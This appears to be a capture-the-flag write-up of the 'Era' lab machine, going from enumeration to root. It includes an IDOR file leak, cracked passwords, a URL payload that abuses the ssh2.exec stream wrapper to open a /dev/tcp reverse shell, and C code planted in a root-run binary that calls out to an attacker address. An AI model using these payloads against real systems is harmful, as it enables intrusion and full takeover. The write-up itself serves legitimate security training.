# Era CTF Writeup

## Initial Enumeration

First, I started with an Nmap scan against the target:

```bash
nmap -sC -sV -Pn -p- 10.129.119.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 19:01 CDT
Nmap scan report for 10.129.119.222
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So, the main exposed services were **FTP** and **HTTP (era.htb)**.

---

## Directory and VHOST Enumeration

Checking web directories with Gobuster:

```bash
gobuster dir -u http://era.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
...
/css                  
/fonts                
/img                  
/index.html           
/js                   
```

Nothing useful here.

Next, I tried subdomain/VHOST brute forcing with Gobuster, but it didn’t return anything:

```bash
gobuster vhost -u http://era.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
...
Finished
```

I switched to **ffuf** instead:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H  "Host: FUZZ.era.htb" -u http://era.htb -t 200 -fs 154
```

Result:

```
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 101ms]
```

Discovered: **file.era.htb**

---

## Exploring file.era.htb

Visiting the subdomain revealed a file storage service:

![alt text](image.png)

I tested login forms for SQLi — no luck.
So I ran directory enumeration:

```bash
gobuster dir -u http://file.era.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 --exclude-length 6765 -x php
...
/download.php         
/login.php            
/register.php         
/upload.php           
/manage.php           
```

I registered a new account and tested file uploads.

Upload worked successfully:

![alt text](image-2.png)

---

## IDOR Discovery

Downloaded files used an **id** parameter. I tested for **IDOR** by brute-forcing with Burp Intruder:

![alt text](image-3.png)

Results showed additional accessible files:

![alt text](image-4.png)

From these files, I extracted the whole application source code:

```bash
ls 
bg.jpg css download.php filedb.sqlite functions.global.php ...
```

---

## Database Dump and Password Cracking

Inspecting `filedb.sqlite`:

```sql
sqlite3 filedb.sqlite
.dump
...
INSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');
INSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);
...
```

I dumped the hashes and ran John/Hashcat:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
eric : america
yuri : mustang
```

---

## FTP Access

Using the cracked credentials, I logged into FTP:

```bash
ftp 10.129.237.233
Name: yuri
Password: mustang
```

Login was successful, but no sensitive data inside.

---

## Exploiting the Admin Panel (SSRF / RCE)

Reviewing the PHP source, I found a **BETA showcase** feature in `download.php` which accepted a `format` parameter.
If `format` contained `://`, it would prepend it to file paths and pass directly to `fopen()`.

This allowed **PHP stream wrappers** like `ssh2.exec://`.

![alt text](image-5.png)

Since I had the **admin username**, I could reset security questions and log in as admin:

![alt text](image-6.png)

Successfully logged in:

![alt text](image-7.png)

Then I exploited SSRF/RCE via:

```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F<YOUR_IP>%2F4444%200%3E%261%22;
```

Got a shell back:

![alt text](image-8.png)

---

## Privilege Escalation

I switched users to **eric** with the cracked password:

```bash
su eric
Password: america
```

Then stabilized the shell:

```bash
python3 -c 'import pty,os; os.putenv("TERM","xterm-256color"); pty.spawn("/bin/bash")'
```

Uploaded **linpeas.sh** and found an interesting vector:

```bash
Group devs:
/opt/AV/periodic-checks/monitor
```

The `monitor` binary was group-writable and executed periodically as root.

I replaced it with a custom payload:

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.129/1337 0>&1", NULL);
    return 0;
}
```

Compiled, signed, and replaced the binary:

```bash
x86_64-linux-gnu-gcc -o monitor exploit.c -static
mv monitor /opt/AV/periodic-checks/monitor
chmod +x /opt/AV/periodic-checks/monitor
```

Waited a moment and caught root shell:

```bash
nc -lnvp 1337 -s 10.10.14.129
...
root@era:~#
```

---

# Conclusion

The exploitation chain:

1. **Subdomain enumeration** → file.era.htb
2. **File upload + IDOR** → downloaded full source code + DB
3. **Password cracking** → eric / america, yuri / mustang
4. **SSRF/RCE via admin panel stream wrapper** → remote shell
5. **Group writable root-cron binary (`monitor`)** → Privilege escalation to root

This challenge demonstrated:

* The impact of weak access control (IDOR).
* Danger of using PHP stream wrappers unsafely.
* Classic misconfigurations (writable cron jobs).
